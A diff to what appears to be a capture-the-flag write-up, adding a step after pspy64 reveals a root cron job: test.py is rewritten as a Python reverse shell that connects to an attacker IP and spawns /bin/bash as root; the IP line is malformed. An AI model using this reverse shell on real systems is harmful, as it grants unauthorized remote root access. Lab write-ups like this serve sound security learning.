@@ -114,7 +114,17 @@ I used the process monitoring tool pspy64 to check if any cron jobs executed by 
 ![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311034919.png)
 
 
-T
+Then modify the test.py to reverse shell with root privileges :
+
+```
+import socket,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.1, 4445)) # METS TON IP ICI
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/bash")
+```
 
 
 
